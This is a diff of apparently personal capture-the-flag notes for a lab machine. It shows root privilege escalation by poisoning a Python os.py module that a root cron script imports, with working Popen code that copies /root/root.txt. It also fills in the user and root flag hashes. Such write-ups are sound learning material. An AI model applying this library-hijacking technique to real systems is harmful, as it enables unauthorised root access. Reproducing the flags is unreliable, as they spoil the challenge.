@@ -853,12 +853,12 @@ No mail for friend
 
 second time we've seen conflicting messages, it's like something is going on in the background, so.. pspy is probably the thing we need
 
-linpeas didn't show us much new, so going that way 
+linpeas didn't show us much new, so going that way
 
 ```
-2023/03/19 01:28:01 CMD: UID=0    PID=31800  | /bin/sh -c /opt/server_admin/reporter.py 
-2023/03/19 01:28:01 CMD: UID=0    PID=31799  | /bin/sh -c /opt/server_admin/reporter.py 
-2023/03/19 01:28:01 CMD: UID=0    PID=31798  | /usr/sbin/CRON -f 
+2023/03/19 01:28:01 CMD: UID=0    PID=31800  | /bin/sh -c /opt/server_admin/reporter.py
+2023/03/19 01:28:01 CMD: UID=0    PID=31799  | /bin/sh -c /opt/server_admin/reporter.py
+2023/03/19 01:28:01 CMD: UID=0    PID=31798  | /usr/sbin/CRON -f
 ```
 
 almost right off the bat.. because we forgot to manually check `/opt` contents
@@ -884,8 +884,62 @@ print "[+] Trying to send email to %s"%to_address
 
 and now we see why `os.py` is important. because the command is commented out and we don't have write access, presumably we need to poison some initialization that is caused by the import?
 
+poisoned with
+
+```python
+import subprocess
+
+subprocess.run(["cp", "/root/root.txt", "/tmp/root.txt"])
+```
+
+unfortunately, circular dependency:
+```
+friend@FriendZone:~$ python /opt/server_admin/reporter.py
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site.py", line 68, in <module>
+    import os
+  File "/usr/lib/python2.7/os.py", line 28, in <module>
+    import subprocess
+  File "/usr/lib/python2.7/subprocess.py", line 297, in <module>
+    class Popen(object):
+  File "/usr/lib/python2.7/subprocess.py", line 1050, in Popen
+    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
+AttributeError: 'module' object has no attribute 'WIFSIGNALED'
+
+```
+
+```python
+import subprocess
+subprocess.Popen(["cp", "/root/root.txt", "/tmp/root.txt"])
+```
+
+worked, to get
+```
+friend@FriendZone:~$ ls -l /tmp
+total 20
+-rw-r----- 1 root root   33 Mar 19 02:10 root.txt
+```
+
+unfortunately, had to reset the machine, and lost our access to the file
+
+```
+friend@FriendZone:~$ ls -l /tmp
+total 24
+-rw-rw-r-- 1 friend friend   33 Mar 19 02:12 root2.txt
+-rw-r----- 1 root   root     33 Mar 19 02:10 root.txt
+drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-apache2.service-Hjbba8
+drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-systemd-resolved.service-TBwOrF
+drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-systemd-timesyncd.service-xI3hz6
+drwx------ 2 root   root   4096 Mar 19 02:08 vmware-root_220-860594501
+friend@FriendZone:~$ cat /tmp/root2.txt
+fc1b599c5ea0063415dcc163b412f8fc
+```
+
+there we go
+
 ## flag
 ```
-user:
-root:
+user:0ee5a07e71eac460cab9879e13eddbc8
+root:fc1b599c5ea0063415dcc163b412f8fc
 ```
+
